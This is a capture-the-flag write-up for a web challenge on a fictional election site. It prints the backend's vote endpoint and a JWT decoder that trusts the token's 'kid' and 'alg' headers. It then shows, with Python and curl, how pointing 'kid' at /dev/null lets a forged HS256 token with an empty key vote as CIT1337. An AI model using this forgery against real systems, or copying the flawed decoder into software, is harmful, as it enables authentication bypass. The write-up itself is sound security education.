---
layout: writeup
title: The voting logs ain't making sense
tags: WebX
excerpt: "A paranormal event was observed during the voting. Apparently multiple successful vote submissions were starting to be observed in the logs for an individual and votes for citizens that don't exist? Can you find out how an attacker may have done this and submit a vote for the citizen ID CIT1337 who has already voted?"
---

## Description

A paranormal event was observed during the voting. Apparently multiple successful vote submissions were starting to be observed in the logs for an individual and votes for citizens that don't exist? Can you find out how an attacker may have done this and submit a vote for the citizen ID CIT1337 who has already voted?


The code for the backend of all week 4 challenges was the same, so we also had that.


## Solution

I ended up solving this challenge in the exact same was as [I can be anyone](./I-can-be-anyone) as such the writeup is practically the same, as it was the same challenge

The challenge was about forging a vote for the system that it accepted. Here is the code for vote submissions.

```python
##### VOTE SUBMISSION
@voting_bp.route("/submit-vote", methods=["POST"])
def submit_vote():
    """
    Citizen submits a vote for their chosen party
    """
    try:
        auth_header = request.headers.get("Authorization")
        if not auth_header:
            return jsonify({"error": "Missing Authorization header"}), 401

        payload = decode_jwt_token(auth_header)
        if not payload:
            return jsonify({"error": "Invalid or expired token"}), 401

        data = request.get_json()
        if not data:
            return jsonify({"error": "No JSON data provided"}), 400

        party = data.get("party")
        if not party:
            return jsonify({"error": "Missing required field: party"}), 400

        citizen_id = payload.get("citizenId")
        name = payload.get("name")
        state = payload.get("state")
        vote_identifier = payload.get("vote_identifier")

        if not all([citizen_id, name, state, vote_identifier]):
            return jsonify({"error": "Invalid token payload"}), 401

        db = Database()
        success = db.submit_vote(citizen_id, party, state, vote_identifier)

        if success:
            response_data = {
                "success": True,
                "message": "Vote submitted successfully",
                "citizen_id": citizen_id,
                "party": party,
                "state": state
            }

            if citizen_id == "CIT100":
                response_data["i_can_be_anyone_flag"] = current_app.config["I_CAN_BE_ANYONE_FLAG"]
            elif citizen_id == "CIT1337":
                response_data["the_voting_logs_aint_making_sense_flag"] = current_app.config["THE_VOTING_LOGS_AINT_MAKING_SENSE_FLAG"]

            return jsonify(response_data)
        else:
            return jsonify({"error": "Vote already submitted or database error"}), 409

    except Exception as e:
        return jsonify({"error": f"Failed to submit vote: {str(e)}"}), 500
```

This shows how in order to submit a vote, you need a valid JWT, and you need a `party` value in your request body. Then if the `citizen_id` of your JWT is `CIT1337` you get the flag.

Lets look at the JWT code to see if we can forge a JWT token.

```python
import jwt

#...

def decode_jwt_token(token):
    try:
        if token.startswith("Bearer "):
            token = token[7:]

        unverified_header = jwt.get_unverified_header(token)
        kid = unverified_header.get("kid")
        alg = unverified_header.get("alg")

        if kid:
            try:
                public_key_path = kid
                with open(public_key_path, "r") as key_file:
                    public_key = key_file.read()
            except FileNotFoundError:
                return None
            except Exception:
                return None
        else:
            public_key_path = current_app.config["JWT_PUBLIC_KEY_PATH"]
            with open(public_key_path, "r") as key_file:
                public_key = key_file.read()

        payload = jwt.decode(
            token,
            public_key,
            algorithms=[alg]
        )

        return payload

    except jwt.ExpiredSignatureError:
        return None
    except jwt.InvalidTokenError:
        return None
    except Exception:
        return None
```



This is a dupliate challenge so I already knew the exploit was `kid` injection. 

Normally in a JWT if it has the `kid` header, and in this case, the `kid` header is used to dictate which key should be used to decrypt the token and thereby authenticate it. Therefore, if you set the `kid` header to point to a value that the user knows the value of, and then sign a JWT token with that key using a symetric algorithm such as `HS256` then you can forge any token you want. Luckily even if we don't know much files on this system, linux has a few preset files that you cant change the values within that we can just use for the symetric key, as we know its value. In this case I am using `/dev/null` this file is completely empty, and anything put in here is removed, so the symettric key in this case would be an empty string.

As such, lets make a JWT token in just the python terminal

```python
>>> import jwt
>>> payload = {"citizenId": "CIT1337", "name": "John Doe", "state": "Izzi", "vote_identifier": "ab23b8"}
>>> headers = {"kid": "/dev/null"}
>>> jwt.encode(payload, "", algorithm="HS256", headers=headers)
'eyJhbGciOiJIUzI1NiIsImtpZCI6Ii9kZXYvbnVsbCIsInR5cCI6IkpXVCJ9.eyJjaXRpemVuSWQiOiJDSVQxMzM3IiwibmFtZSI6IkpvaG4gRG9lIiwic3RhdGUiOiJJenppIiwidm90ZV9pZGVudGlmaWVyIjoiYWIyM2I4In0.zUOmbT9syBX09fuzdRFb8T4b-YZwOWmGgGo5KqvOdH0'
```

There is our token, time to submit our vote:

```bash
$ curl "http://mobile-app.commission.freedonia.vote/api/voting/submit-vote" -X POST -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsImtpZCI6Ii9kZXYvbnVsbCIsInR5cCI6IkpXVCJ9.eyJjaXRpemVuSWQiOiJDSVQxMzM3IiwibmFtZSI6IkpvaG4gRG9lIiwic3RhdGUiOiJJenppIiwidm90ZV9pZGVudGlmaWVyIjoiYWIyM2I4In0.zUOmbT9syBX09fuzdRFb8T4b-YZwOWmGgGo5KqvOdH0" -H "Content-Type: application/json" -d '{"party":1}'
{"citizen_id":"CIT1337","message":"Vote submitted successfully","party":1,"state":"Izzi","success":true,"the_voting_logs_aint_making_sense_flag":"cysea{you_got_to_be_KIDding_me_b60c85395d}"}
```

And look at that, we get the flag as the reply `cysea{you_got_to_be_KIDding_me_b60c85395d}`
